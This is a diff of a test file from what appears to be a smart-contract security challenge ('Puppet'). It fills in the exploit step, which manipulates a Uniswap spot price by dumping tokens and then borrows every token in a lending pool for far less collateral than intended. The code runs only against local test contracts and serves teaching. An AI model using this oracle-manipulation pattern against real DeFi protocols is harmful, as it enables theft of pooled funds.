@@ -102,7 +102,18 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        let price = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(`## CURRENT PRICE TO BORROW ALL POOL TOKENS: ${ethers.utils.formatEther(price)} ETH`);
+
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp  + 100;
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther("999"), ethers.utils.parseEther("1"), deadline);
+
+        let newPrice = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(`## NEW PRICE TO BORROW ALL POOL TOKENS: ${ethers.utils.formatEther(newPrice)} ETH`);
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: newPrice});
+        console.log("## BORROWED ALL THE POOL TOKENS");
     });
 
     after(async function () {
